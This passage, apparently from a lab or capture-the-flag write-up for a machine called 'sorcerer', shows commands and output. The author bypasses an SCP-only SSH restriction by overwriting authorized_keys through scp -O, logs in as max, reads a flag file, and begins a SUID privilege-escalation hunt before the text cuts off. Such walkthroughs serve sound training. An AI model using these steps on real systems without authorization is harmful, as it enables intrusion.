1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Downloads/home/max]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> scp_wrapper.sh &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">#!/bin/bash</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">case <span class="cm-def">$SSH_ORIGINAL_COMMAND</span> <span class="cm-keyword">in</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-string">'scp'</span>*)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-def">$SSH_ORIGINAL_COMMAND</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ;;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> *)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">echo</span> <span class="cm-string">"ACCESS DENIED."</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  scp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ;;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">esac</span> &nbsp; &nbsp; &nbsp; </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 263px;"></div><div class="CodeMirror-gutters" style="display: none; height: 263px;"></div></div></div></pre><p><span>To bypass this, I audited the </span><code>authorized_keys</code><span> file and removed the </span><code>command=</code><span> prefix that was forcing the wrapper script.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Downloads/home/max/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> authorized_keys &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty<span class="cm-def">,command</span><span class="cm-operator">=</span><span class="cm-string">"/home/max/scp_wrapper.sh"</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa<span class="cm-operator">+</span>zpZk2hb/ZsULBKQgFuITVtahJispqfRY<span class="cm-operator">+</span>kqF8RK6Tr0vDcCP4jbCjadJ3mfY<span class="cm-operator">+</span>G5rsLbGfek3vb9drJkJ0<span class="cm-operator">+</span>lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB<span class="cm-operator">+</span>L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl<span class="cm-operator">+</span>KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR<span class="cm-operator">+</span>Tkv8jexROrLzc<span class="cm-operator">+</span>AEk<span class="cm-operator">+</span>cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4<span class="cm-operator">+</span>klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4<span class="cm-operator">+</span>idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1<span class="cm-operator">+</span>gXeXFc88<span class="cm-operator">+</span>DZyGVg4yW1cdSR/<span class="cm-operator">+</span>jTKmnluC8BGk<span class="cm-operator">+</span>hokfGbX3fq9BIeiFebGnIy<span class="cm-operator">+</span>py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT<span class="cm-operator">+</span><span class="cm-def">ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ</span><span class="cm-operator">==</span> max@sorcerer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 176px;"></div><div class="CodeMirror-gutters" style="display: none; height: 176px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Downloads/home/max/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> id_rsa.pub &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa<span class="cm-operator">+</span>zpZk2hb/ZsULBKQgFuITVtahJispqfRY<span class="cm-operator">+</span>kqF8RK6Tr0vDcCP4jbCjadJ3mfY<span class="cm-operator">+</span>G5rsLbGfek3vb9drJkJ0<span class="cm-operator">+</span>lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB<span class="cm-operator">+</span>L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl<span class="cm-operator">+</span>KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR<span class="cm-operator">+</span>Tkv8jexROrLzc<span class="cm-operator">+</span>AEk<span class="cm-operator">+</span>cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4<span class="cm-operator">+</span>klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4<span class="cm-operator">+</span>idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1<span class="cm-operator">+</span>gXeXFc88<span class="cm-operator">+</span>DZyGVg4yW1cdSR/<span class="cm-operator">+</span>jTKmnluC8BGk<span class="cm-operator">+</span>hokfGbX3fq9BIeiFebGnIy<span class="cm-operator">+</span>py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT<span class="cm-operator">+</span><span class="cm-def">ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ</span><span class="cm-operator">==</span> max@sorcerer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 176px;"></div><div class="CodeMirror-gutters" style="display: none; height: 176px;"></div></div></div></pre><p><span>All of the prefix is removed.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> authorized_keys </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa<span class="cm-operator">+</span>zpZk2hb/ZsULBKQgFuITVtahJispqfRY<span class="cm-operator">+</span>kqF8RK6Tr0vDcCP4jbCjadJ3mfY<span class="cm-operator">+</span>G5rsLbGfek3vb9drJkJ0<span class="cm-operator">+</span>lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB<span class="cm-operator">+</span>L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl<span class="cm-operator">+</span>KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR<span class="cm-operator">+</span>Tkv8jexROrLzc<span class="cm-operator">+</span>AEk<span class="cm-operator">+</span>cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4<span class="cm-operator">+</span>klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4<span class="cm-operator">+</span>idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1<span class="cm-operator">+</span>gXeXFc88<span class="cm-operator">+</span>DZyGVg4yW1cdSR/<span class="cm-operator">+</span>jTKmnluC8BGk<span class="cm-operator">+</span>hokfGbX3fq9BIeiFebGnIy<span class="cm-operator">+</span>py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT<span class="cm-operator">+</span><span class="cm-def">ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ</span><span class="cm-operator">==</span> max@sorcerer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 176px;"></div><div class="CodeMirror-gutters" style="display: none; height: 176px;"></div></div></div></pre><p><span>However, the connection still failed with an error.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ scp</span> <span class="cm-attribute">-i</span> id_rsa authorized_keys max@<span class="cm-def">$IP</span>:/home/max/.ssh/authorized_keys</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">scp: Received message too long <span class="cm-number">1094927173</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">scp: Ensure the remote shell produces no output <span class="cm-keyword">for</span> non-interactive sessions.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre><p><span>I pulled up the man page of </span><code>scp</code><span> and found the following option: </span><code>-O</code><span> . This option allows you to use the legacy SCP protocol for file transfers instead of the SFTP protocol. Let’s give this a try.</span></p><p><img src="./sorcerer.assets/image-20260128231951392.png" alt="image-20260128231951392"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ scp</span> <span class="cm-attribute">-O</span> <span class="cm-attribute">-i</span> id_rsa authorized_keys max@<span class="cm-def">$IP</span>:/home/max/.ssh/authorized_keys</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">authorized_keys &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">100</span>% &nbsp;<span class="cm-number">836</span> &nbsp; &nbsp;<span class="cm-number">17</span>.5KB/s &nbsp; <span class="cm-number">00</span>:00 &nbsp; &nbsp;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 66px;"></div><div class="CodeMirror-gutters" style="display: none; height: 66px;"></div></div></div></pre><h1 id='shell-as-max'><span>Shell as </span><code>max</code></h1><p><span>I finally was able to authenticate in.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ ssh</span> <span class="cm-attribute">-i</span> id_rsa max@<span class="cm-def">$IP</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max@sorcerer:~<span class="cm-def">$ whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre><p><span>Found </span><code>local.txt</code><span> in </span><code>/home/dennis</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max@sorcerer:/home<span class="cm-def">$ cd</span> /home</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max@sorcerer:/home<span class="cm-def">$ ls</span> <span class="cm-attribute">-aR</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  dennis  francis  max  miriam  sofia</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./dennis:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  .bash_logout  .bashrc  local.txt  .profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./francis:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  .bash_logout  .bashrc  .profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./max:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  .bash_logout  .bashrc  .profile  scp_wrapper.sh  .ssh  tomcat-users.xml.bak</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./max/.ssh:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  authorized_keys  id_rsa  id_rsa.pub</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./miriam:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  .bash_logout  .bashrc  .profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./sofia:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">.  ..  .bash_logout  .bashrc  .profile</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 483px;"></div><div class="CodeMirror-gutters" style="display: none; height: 483px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max@sorcerer:/home/dennis<span class="cm-def">$ cat</span> local.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">c86a...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 44px;"></div><div class="CodeMirror-gutters" style="display: none; height: 44px;"></div></div></div></pre><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><code>start-stop-daemon</code><span> has a SUID bit set to its binary, which is very unusual.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max@sorcerer:/tmp<span class="cm-def">$ find</span> / <span class="cm-attribute">-type</span> f <span class="cm-attribute">-perm</span> <span class="cm-attribute">-4000</span> <span class="cm-attribute">-ls</span> <span class="cm-number">2</span>&gt;/dev/null</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">166328</span> &nbsp; &nbsp;<span class="cm-number">116</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; 